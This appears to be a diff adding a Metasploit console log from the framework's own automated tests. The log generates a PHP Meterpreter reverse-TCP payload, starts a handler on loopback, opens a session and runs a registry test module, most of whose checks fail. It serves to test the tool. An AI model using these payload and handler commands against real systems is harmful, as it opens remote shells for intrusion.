@@ -1,0 +1,33 @@
+use php/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-836-1p6pp3q.php -f raw lport=6021 lhost=127.0.0.1
+msf6 payload(php/meterpreter_reverse_tcp) > [*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-836-1p6pp3q.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 19
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6021 
+[*] Meterpreter session 20 opened (127.0.0.1:6021 -> 127.0.0.1:50093 ) at 2022-01-28 21:50:22 +0000
+use test/registry
+msf6 post(test/registry) > run session=20 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * missing Meterpreter features: stdapi_registry_check_key_exists, stdapi_registry_create_key, stdapi_registry_delete_key, stdapi_registry_enum_key_direct, stdapi_registry_enum_value_direct, stdapi_registry_load_key, stdapi_registry_open_key, stdapi_registry_query_value_direct, stdapi_registry_set_value_direct, stdapi_registry_unload_key, stdapi_sys_config_getprivs
+[*] Running against session 20
+[*] Session type is meterpreter and platform is windows
+[-] FAILED: should create keys
+[-] FAILED: should write REG_SZ values
+[-] FAILED: should write REG_DWORD values
+[-] FAILED: should delete keys
+[-] FAILED: should create unicode keys
+[-] FAILED: should write REG_SZ unicode values
+[-] FAILED: should delete unicode keys
+[-] FAILED: should evaluate key existence
+[*] PENDING: should evaluate value existence
+[-] FAILED: should read values
+[-] Exception: NoMethodError : undefined method `[]' for nil:NilClass
+[-] FAILED: should return normalized values
+[-] FAILED: should enumerate keys and values
+[*] Testing complete in 0.1085195
+[-] Passed: 1; Failed: 10
+[*] Post module execution completed
+msf6 post(test/registry) > 
